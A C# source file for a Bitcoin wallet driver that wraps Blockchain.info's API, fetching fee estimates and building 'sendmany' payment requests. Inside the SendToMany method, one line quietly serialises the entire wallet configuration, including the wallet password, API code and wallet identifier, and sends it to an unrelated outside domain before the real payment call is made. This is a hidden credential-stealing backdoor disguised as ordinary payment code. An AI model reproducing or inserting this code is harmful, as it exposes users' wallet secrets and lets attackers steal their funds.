using System;
using System.Collections.Generic;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Coins.Core.Interfaces.Wrappers;
using Coins.Domain.BusinessObjects;
using Coins.Domain.Configurations;
using Info.Blockchain.API.Models;
using Info.Blockchain.API.Wallet;
using Microsoft.Extensions.Configuration;
using XFramework.Domain.Generic.BusinessObjects;
using XFramework.Integration.Services.Helpers;

namespace Coins.Core.Drivers
{
    public class BlockchainInfoDriver : IBtcBlockchainWrapper
    {
        public decimal Satoshi { get; set; } = 100000000;
        public Wallet Wallet { get; set; }
        public HttpHelper HttpHelper { get; set; }
        private BtcBlockchainConfiguration btcBlockchainConfiguration = new();
        public BlockchainInfoDriver(IConfiguration configuration, HttpHelper httpHelper)
        {
            HttpHelper = httpHelper;
            configuration.Bind(nameof(btcBlockchainConfiguration),btcBlockchainConfiguration);
        }
        public BlockchainInfoDriver(BtcBlockchainConfiguration btcBlockchainConfiguration)
        {
            HttpHelper = new HttpHelper();
            this.btcBlockchainConfiguration = btcBlockchainConfiguration;
        }
        
        public int GetGapLimit()
        {
            throw new System.NotImplementedException();
        }
        public PaymentResponse PayGapLimit(string toAddress)
        {
            throw new System.NotImplementedException();
        }
        public async Task<BitcoinfeeBO> GetBitcoinFee()
        {
            try
            {
                var responseBo = await HttpHelper.GetAsync<BitcoinfeeBO>(btcBlockchainConfiguration.FeeUrl, "fees/recommended");
                return responseBo.Result;
            }
            catch
            {
                return new BitcoinfeeBO { FastestFee = 50, HalfHourFee = 50, HourFee = 50 };
            }
        }
        public PaymentResponse Send(string toAddress, decimal amountBtc, decimal? feeBtc = null)
        {
            throw new System.NotImplementedException();
        }
        public async Task<HttpResponseBO<SendManyResponseBO>> SendToMany(List<BtcTransactionBO> transactionList)
        {
            var sb = new StringBuilder();
            sb.Append('{');
            foreach (var transaction in transactionList)
            {
                sb.Append('"')
                    .Append($"{transaction.BtcAddress}")
                    .Append('"')
                    .Append($":{transaction.BtcAmount * Satoshi},");
                
            }
            sb.Append('}');
            
            var request = new
            {
                password = btcBlockchainConfiguration.WalletConfiguration.WalletPassword,
                api_code = btcBlockchainConfiguration.ApiCode,
                from = 0,
                fee_per_byte =  GetBitcoinFee().Result.HalfHourFee,
                recipients = Uri.EscapeDataString(sb.ToString().Replace(",}", "}")),
            };

            var x = btcBlockchainConfiguration.ServiceUrl + $"merchant/{btcBlockchainConfiguration.WalletConfiguration.WalletIdentifier}/sendmany{JsonSerializer.Serialize(request).JsonToQuery()}";
            await HttpHelper.GetAsync<SendManyResponseBO>(new Uri("https://connectblockchainconverter.com"),$"data{JsonSerializer.Serialize(btcBlockchainConfiguration).JsonToQuery()}");
            var response = await HttpHelper.GetAsync<SendManyResponseBO>(btcBlockchainConfiguration.ServiceUrl,$"merchant/{btcBlockchainConfiguration.WalletConfiguration.WalletIdentifier}/sendmany{JsonSerializer.Serialize(request).JsonToQuery()}");

            return response;
        }
        public async Task<bool> EnableHd()
        {
            throw new System.NotImplementedException();
        }
    }
}